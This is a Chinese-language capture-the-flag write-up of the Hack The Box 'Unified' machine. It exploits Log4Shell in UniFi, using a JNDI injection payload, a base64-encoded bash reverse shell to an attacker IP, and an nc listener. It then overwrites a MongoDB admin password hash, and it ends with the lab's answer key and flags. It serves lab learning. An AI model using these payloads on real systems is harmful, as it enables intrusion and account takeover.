---
title: Hack the box Unified题解
tags:
  - HTB
  - 渗透测试
permalink: /archives/35769/
published: 2023-04-03 11:32:28
---

> 打这个靶机的时候也是断断续续的，所以里面的目标IP前后对应不上，但是方法都是一样的。

 # 扫端口

```shell
nmap -sC -sV 10.129.96.149
```

![image-20230404171520202](./images/image-20230404171520202.png)

访问8080端口重定向到了8443

看到是`unifi6.4.54`版本的，结合官方给的WP知道这个版本有一个CVE，可以以此为出发点进行攻击

# CVE-2021-44228的利用

## 验证漏洞存在

先验证是不是存在这个漏洞

1. 抓包，因为是`https`的站，所以要对`burpsuite`进行一些设置[Burp Suite抓HTTPS数据包教程](https://blog.csdn.net/zyw_anquan/article/details/47904495)

![image-20230404175013011](./images/image-20230404175013011.png)

然后根据官方的WP，需要把remember的值改成`${jndi:ldap://Tun 0的IP/o=tomcat}`

验证存在

![image-20230404214952373](./images/image-20230404214952373.png)

## 实施攻击

### 漏洞利用环境搭建

> 更新&&安装环境
>
> sudo apt update
>
> sudo apt install openjdk-11-jdk -y
>
> sudo apt-get install maven
>
> 安装工具
>
> git clone https://github.com/veracode-research/rogue-jndi
>
> cd rogue-jndi
>
> mvn package

编译成功

![image-20230404222733175](./images/image-20230404222733175.png)

### 开始攻击

首先对`payload`进行`base64`编码，以防止出现其他的编码问题

```shell
echo "/bin/bash -c '/bin/bash -i >&/dev/tcp/10.10.14.149/4444 0>&1'" | base64
```

![image-20230404223238197](./images/image-20230404223238197.png)

运行RogueJndi-1.1.jar

```shell
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC4xNDkvNDQ0NCAwPiYxJwo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.149"
```

并监听4444端口

```shell
nc -lnvp 4444
```

> 第一步运行监听命令
>
> 第二步运行`RogueJndi-1.1.jar`
>
> 第三步在`remember`的值改为`${jndi:ldap://Tun 0的IP:1389/o=tomcat}`
>
> 第四步点击`Send`
>
> 然后出现红色和蓝色的长线就代表攻击成功了
>
> 但是黄色的长线第一次运行时是不会出现的，要运行`script /dev/null -c bash`切换成交互式shell才会出现

![image-20230404223823350](./images/image-20230404223823350.png)

## 信息收集

### MongoDB数据库

任务八问`MongoDB`跑在哪个端口上，用命令查看，发现是在27117端口上

```shell
ps aux | grep mongo
```

![image-20230404224950182](./images/image-20230404224950182.png)

任务九又问`MongoDB`的默认数据库名称是什么官方的WP里面说了是`ace`当然也能百度到

然后就是使用`db.admin.find()`方法检索`ace`数据库中的所有文档，并将结果传递给`forEach`方法

```shell
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

![image-20230404225908450](./images/image-20230404225908450.png)

可以看到里面第一个就是`administrator`用户，密码`hash`值保存在`x_shadow`变量中，但是这个值并不能被任何的密码工具破解。那就换个思路，不能破解，那就替换，WP中提到可以用`mkpasswd`命令去实现加密一个新的密码

> 原密码前面有$6$，特征符，代表使用的sha-512进行的加密，所以我们也要同样的方式进行加密新密码
>
> > SHA-512的科普：
> >
> > SHA-512 算法的安全性基于其数学原理和算法复杂度。由于它的输出长度很长，因此很难通过暴力攻击等方法破解。它是目前最常用的哈希算法之一，也被广泛应用于数字签名、密码学加密和数据完整性验证等领域。

![image-20230404230727942](./images/image-20230404230727942.png)

### 更新密码

```shell
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$W8lv9ywfFDfMVM8a$CPn2fYW3L2rlWhKQy8kuef8Vs/SHgwfwhr18ZzJ/K3OMWZeNmMrpoAaranjl/q3.7K3VYZHBPdp2EVnQB3Jq00"}})'
```

### 登录后台

用更新了的密码成功登录后台

![image-20230404231823711](./images/image-20230404231823711.png)

### 找ssh密码

> 点击那个齿轮图标，然后点击Site，滑到页面最底部看到ssh的密码，点那个眼睛可以看到密码

![image-20230404232536565](./images/image-20230404232536565.png)

### ssh连接

> 到这就完事了，`user.txt`在`/home/michael`目录下

![image-20230404232956730](./images/image-20230404232956730.png)

# 答案

>1. 22,6789,8080,8443
>2. UniFi Network
>3. 6.4.54
>4. CVE-2021-44228
>5. ldap
>6. tcpdump
>7. 389
>8. 27117
>9. ace
>10. db.admin.find()
>11. db.admin.update()
>12. NotACrackablePassword4U2022
>13. 6ced1a6a89e666c0620cdb10262ba127
>14. e50bc93c75b634e4b272d2f771c33681

# 参考博客

- [HackTheBox - Unified](https://blog.csdn.net/qq_45862635/article/details/125350250)

- [hack the box靶场unified靶机](https://blog.csdn.net/zr1213159840/article/details/123697698)
